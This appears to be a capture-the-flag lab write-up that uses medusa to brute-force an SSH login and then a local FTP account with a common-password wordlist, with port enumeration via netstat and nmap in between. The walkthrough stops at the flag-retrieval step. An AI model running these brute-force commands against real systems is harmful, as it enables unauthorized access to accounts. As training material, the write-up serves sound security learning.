# Web Services

### What was the password for the ftpuser?

Getting the flag:

**Step 1** - Launch the attack with this password [wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt):

* {% code overflow="wrap" %}
  ```bash
  medusa -h <SERVER_IP> -n <SERVER_PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
  ```
  {% endcode %}
*

    <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Login to the server with the password we just found:

* {% code overflow="wrap" %}
  ```bash
  ssh sshuser@<SERVER-IP> -p SERVER_PORT
  ```
  {% endcode %}
*

    <figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Expand the Attack Surface:

* Execute the **netstat** command to listen open ports and listen service:
  *   ```bash
      netstat -tulpn | grep LISTEN
      ```


  *   And we found the port 21 open

      <figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
* Confirm the port 21 is open with nmap:
  * ```bash
    nmap 127.0.0.1
    ```
  *

      <figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Targeting the FTP Server:

* Brute-force the authentication mechanism:
  * ```bash
    medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
    ```
    *



**Step 5** - Retrieve the flag:
